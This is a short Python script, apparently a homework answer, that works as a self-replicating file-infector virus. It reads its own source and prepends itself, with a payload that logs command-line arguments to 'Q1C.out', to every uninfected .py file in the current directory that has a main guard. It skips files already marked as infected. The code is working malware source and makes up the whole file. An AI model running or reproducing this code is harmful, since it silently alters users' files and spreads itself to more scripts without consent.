from pathlib import Path
import sys

LOGFILE = "Q1C.out"

#read current script code
with open(__file__, "r", encoding="utf-8") as f:
    virus_code = f.read()

#loop through other python files in the directory
for input_file in Path.cwd().glob("*.py"):
    content = input_file.read_text(encoding="utf-8")
    if "Q1C.out" in content: #if it is already infected, continue
        continue
    
    if "__name__ == \"__main__\":" not in content:
        continue;

    payload = (
            '\nwith open("Q1C.out","a") as f:\n'
            '    f.write(" ".join(__import__("sys").argv) + "\\n")\n')
    #adds virus to python files 
    infect_code = payload + "\n" + virus_code + "\n" + content
    input_file.write_text(infect_code, encoding="utf-8")
         
